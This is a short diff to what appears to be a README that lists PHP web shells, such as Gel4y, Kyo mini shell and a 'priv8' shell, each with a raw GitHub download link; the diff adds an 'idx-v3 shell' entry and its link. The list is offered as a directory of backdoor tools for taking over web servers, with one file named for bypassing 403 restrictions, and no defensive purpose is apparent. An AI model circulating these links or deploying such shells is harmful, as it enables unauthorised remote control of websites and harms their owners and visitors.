@@ -7,6 +7,7 @@
 
 
 
+* idx-v3 shell [idx]
 * P.A.S Fork [PaS]
 * Gel4y shell [g4y]
 * Kyo mini shell [kyo]
@@ -19,6 +20,7 @@
 * Ngiiix1337 priv8 Shell [PRIV]
 
 
+[idx]: https://raw.githubusercontent.com/liiuxii/zxc/main/shell-v3.php
 [PaS]: https://raw.githubusercontent.com/liiuxii/zxc/main/pas_fork.php
 [g4y]: https://raw.githubusercontent.com/liiuxii/zxc/main/bypass403.php
 [kyo]: https://raw.githubusercontent.com/liiuxii/zxc/main/kyo.php
